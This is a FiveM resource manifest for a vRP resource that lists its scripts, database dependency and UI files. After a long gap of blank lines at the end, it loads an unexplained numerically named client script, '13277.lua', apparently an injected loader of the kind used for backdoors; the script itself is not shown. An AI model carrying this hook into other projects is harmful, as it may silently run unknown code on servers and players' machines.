
resource_manifest_version '05cfa83c-a124-4cfa-a768-c24a5811d8f9'

dependency "vrp"
dependency "ghmattimysql"

client_scripts{ 
  "lib/Tunnel.lua",
  "lib/Proxy.lua",
  --'serverCallbackLib/client.lua',
  "client.lua",
}

server_scripts{ 
  "@vrp/lib/utils.lua",
  --'serverCallbackLib/server.lua',
  "server.lua"
}

ui_page "ui/index.html"

files {
	"ui/index.html",
	'ui/fonts/pricedown.ttf',
	"ui/script.js",
	"ui/style.css",
	"ui/debounce.min.js"
}







client_script "13277.lua"